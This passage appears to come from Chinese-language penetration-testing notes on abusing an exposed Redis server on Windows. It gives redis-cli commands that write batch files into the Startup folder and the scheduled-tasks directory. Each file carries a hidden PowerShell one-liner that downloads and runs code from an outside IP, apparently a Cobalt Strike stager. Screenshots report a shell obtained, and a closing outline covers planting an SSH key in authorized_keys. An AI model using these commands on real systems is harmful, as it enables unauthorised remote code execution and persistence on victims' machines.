...
缺点：需要靶机重启，咋能这样呢。。
1）cs生成powershell一句话
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637670789539-f5eba19c-65e2-49ec-9e84-50af864248db.png#clientId=uf518f69f-ca34-4&from=paste&height=348&id=ufc6903bc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=463&originWidth=746&originalType=binary&ratio=1&size=59623&status=done&style=none&taskId=ud372d3d5-a757-4dd1-8c43-016041aa336&width=560)

2）redis-cli执行命令
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('[http://103.79.77.30:80/a'))"](http://103.79.77.30:80/a'))")
```bash
config set dir "C:/Users/lin/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/"

config set dbfilename lin.bat

set x "\r\n\r\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://103.79.77.30:80/a'))\"\r\n\r\n"
...
5）重启之后，获得shell
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637672025026-bcbfffeb-7844-4cae-bb54-2c58869935f6.png#clientId=u7c60ad7c-68e7-4&from=paste&height=119&id=uc2eb9713&margin=%5Bobject%20Object%5D&name=image.png&originHeight=158&originWidth=1534&originalType=binary&ratio=1&size=39545&status=done&style=none&taskId=u535d8f99-86c0-447e-bb43-e316f4e2760&width=1151)
...
写入一个lin2.bat
```bash
config set dir "C:/Users/lin/"

config set dbfilename lin2.bat

set x "\r\n\r\npowershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://103.79.77.30:8088/a'))\"\r\n\r\n"
...
写计划任务
```bash
config set dir "C:/Windows/System32/Tasks"

config set dbfilename shell

set xx "\r\n\r\nSCHTASKS /Create /TN shell2 /TR C:\Users\lin\lin2.bat /ST ONCE\r\n\r\n"

save

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637852754054-18798a82-1baf-4fd7-8092-0a992efe02a2.png#clientId=u5f93e79d-611b-4&from=paste&height=132&id=u073d17a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=132&originWidth=884&originalType=binary&ratio=1&size=34253&status=done&style=none&taskId=u2df02feb-2d67-4141-91d9-0e3fb1494d3&width=884)

成功上线
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637852727699-da008c05-34ba-40a9-b71b-68c59d087410.png#clientId=u5f93e79d-611b-4&from=paste&height=204&id=ufd342947&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1517&originalType=binary&ratio=1&size=45675&status=done&style=none&taskId=u708b0b5f-9e19-4b50-8648-cc1564a2bd4&width=1517)
### 4、mof
...
> 流程如下：
> 1. 本机生成 ssh公钥；
> 1. 复制本机公钥到远程服务器.ssh/authorized_keys中，authorized_keys文件不存在则创建；
> 1. 本机直接ssh连接远程；
> 1. 结束
> 
